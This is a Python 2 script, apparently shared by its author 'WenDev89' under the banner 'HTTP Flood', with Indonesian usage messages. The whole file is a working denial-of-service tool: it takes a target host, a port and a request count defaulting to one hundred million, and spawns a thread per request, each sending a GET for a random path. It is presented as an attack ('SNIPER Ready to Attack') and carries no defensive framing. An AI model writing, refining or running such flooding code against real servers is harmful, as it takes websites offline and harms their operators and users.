# -*- coding: utf-8 -*-
#WenDev89
# Visit my Official.Site https://www.wendev89.site

import random
import socket
import string
import sys
import threading
import time
from termcolor import colored

print colored(' _______  __    _  ___   _______  _______  ______', 'red') 
print colored('|       ||  |  | ||   | |       ||       ||    _ |', 'red') 
print colored('|  _____||   |_| ||   | |    _  ||    ___||   | ||', 'green') 
print colored('| |_____ |       ||   | |   |_| ||   |___ |   |_||_', 'green') 
print colored('|_____  ||  _    ||   | |    ___||    ___||    __  |', 'yellow') 
print colored(' _____| || | |   ||   | |   |    |   |___ |   |  | |', 'yellow') 
print colored('|_______||_|  |__||___| |___|    |_______||___|  |_|', 'blue')
print colored(' ') 
print colored('******** HTTP Flood __by__ <[[ WenDev89 ]]> ********', 'yellow', 'on_red') 
print colored(' ') 

# Parse inputs
host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print "COMMAND : python " + sys.argv[0] + " <IPTARGET> <Port> <Jumlah_Serangan>"
    print colored (' ')
    print colored('CONTOH : ', 'white'), colored('python', 'green'), colored('attack.py', 'blue'), colored('123.456.789', 'red'), colored('80', 'cyan'), colored('1000', 'yellow') 
    print colored(' ') 
    sys.exit(1)

# Convert FQDN to IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print "Oopss..Sorry!! Pastikan memasukkan situs web yg benar" 
    sys.exit(2)

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] * A * T * T * A * C * K * I * N * G * "

    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
    except socket.error, e:
        print " [[ No Connection, Server mungkin sedang Down ]] " + str(e)
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

print "[*] SNIPER Ready to Attack on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
print colored(' ') 
print colored('*** SNIPER sedang mengisi Amunisi ***', 'green') 
print colored(' ') 
print colored('>> >> >>', 'green'), colored(' [10%]', 'yellow') 
time.sleep(5)
print colored('>> >> >> >> >> >>', 'green'), colored(' [35%]', 'yellow') 
time.sleep(5)
print colored('>> >> >> >> >> >> >> >> >> >>', 'green'), colored(' [75%]', 'yellow') 
time.sleep(5)
print colored('>> >> >> >> >> >> >> >> >> >> >> >> >> >> >> >>', 'green'), colored(' [95%]', 'yellow') 
time.sleep(3)

# Spawn a thread per request
all_threads = []
for i in xrange(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads